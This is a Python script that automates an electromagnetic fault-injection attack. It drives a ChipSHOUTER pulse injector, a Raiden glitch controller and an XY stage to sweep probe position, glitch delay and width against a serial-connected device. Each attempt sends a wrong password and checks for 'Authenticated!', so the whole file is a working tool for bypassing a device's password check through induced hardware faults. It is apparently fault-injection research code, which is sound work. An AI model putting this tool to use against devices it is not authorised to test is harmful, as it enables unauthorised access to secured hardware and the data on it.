
from snapy import snapy
import pandas as pd
import matplotlib.pyplot as plt
from raiden_python import raiden 
from chipshouter import ChipSHOUTER
import time
import sys
import serial

raiden = raiden.Raiden(mhz=200, serial_dev="/dev/dev_raiden", baud= 115200, ticks= True) 
snapy = snapy.Snapy(x =5, y=5, offset=1, jog=500)
device = serial.Serial("/dev/dev_serial_logitech", baudrate= 115200, timeout=0.03)

cs = ChipSHOUTER("/dev/dev_chipshouter")


cs.voltage = 380
cs.armed - 0
cs.armed = 1
cs.absent_temp = 60

def send_passw():
    glitch_status = 0
    data = b""
    try:
      device.flush()
      device.write(b"\n")
      line = device.read_until(expected=b"password:")
      device.write(b"t\n")
      data = device.read(20)
    except Exception:
      pass
    if b"Authenticated!" in data and len(data) >2:
      print("Success! ", data)
      glitch_status = 1
    else:
      print(data)
      glitch_status = 0
    return glitch_status

def reset_device():
    raiden.set_param('CMD_GPIO_OUT', value=0)
    raiden.set_param('CMD_GPIO_OUT', value=1)

print ("ID", cs.id)
raiden.reset_glitcher()
raiden.arm(0)


print(raiden.get_buildtime())
raiden.set_param(param="CMD_VSTART", value=1)
raiden.set_param(param="CMD_GLITCH_MAX", value= 1)

x = 0
y = 0
cnt = 0
width = 0
width_max = 15
delay_max = 146015
try_num = 0
try_num_max = 6

pos = None
fwd = True

status = 0

start_pos = snapy.get_current_pos()
print("[+] Current position: {}".format(start_pos))

try:
  time.sleep(1)
  while True:
    delay = 146000
    while delay <= delay_max:
      width = 11
      y = 0
      fwd = True
      while width <= width_max:
        while y < snapy.get_y_max_steps():
          x = 0
          pos = snapy.get_current_pos()
          snapy.record(pos)
          while x < snapy.get_x_max_steps():
            try_num = 0 
            while try_num <= try_num_max:
              print("width: {}, delay: {}, tries: {}".format(width, delay, try_num)) 
              raiden.set_target_power("auto")
              raiden.arm(0)  
              raiden.reset_glitcher()     
              raiden.set_param(param="CMD_GLITCH_DELAY", value= delay)
              raiden.set_param(param="CMD_GLITCH_WIDTH", value= width)
              raiden.set_param(param="CMD_GLITCH_GAP", value= 450)
              raiden.set_param(param="CMD_GLITCH_COUNT", value= 1)
              raiden.set_param(param="CMD_UART_TRIGGER", value= 0xA)
              raiden.set_param(param="CMD_UART_TRIGGER_BAUD", value=115200)
              raiden.arm(1)

              status = send_passw()
              
              while not raiden.is_finished():
                  pass

              if status:
                print("GOT IT !!! => width: {}, delay: {}".format(width, delay))
                raiden.arm(0)
                end_pos = snapy.get_current_pos()
                print("[+] Start position: {}".format(start_pos))
                print("[+] End position: {}".format(end_pos))
                cs.armed = 0
                snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)
                sys.exit(0)


              reset_device()
              print(cnt)      
              print("[+] Glitch cycle completed")
              cnt += 1
              try_num += 1
            x += 1 
            snapy.step(fwd=fwd, axis_x=True, x=x, y=y, status=status)
          y +=1
          fwd = not fwd
          snapy.step(fwd=fwd, axis_x=False, x=x, y=y, status=status)
          end_pos = snapy.get_current_pos()
        width = width + 1
      delay = delay +1
      print("[+] Start position: {}".format(start_pos))
      print("[+] End position: {}".format(end_pos))
      snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)

except KeyboardInterrupt:
    print("Killing raiden...")
    cs.armed = 0
    end_pos = snapy.get_current_pos()
    print("[+] Start position: {}".format(start_pos))
    print("[+] End position: {}".format(end_pos))
    snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)
    snapy.f.close()
    snapy.device.close()
    raiden.arm(0)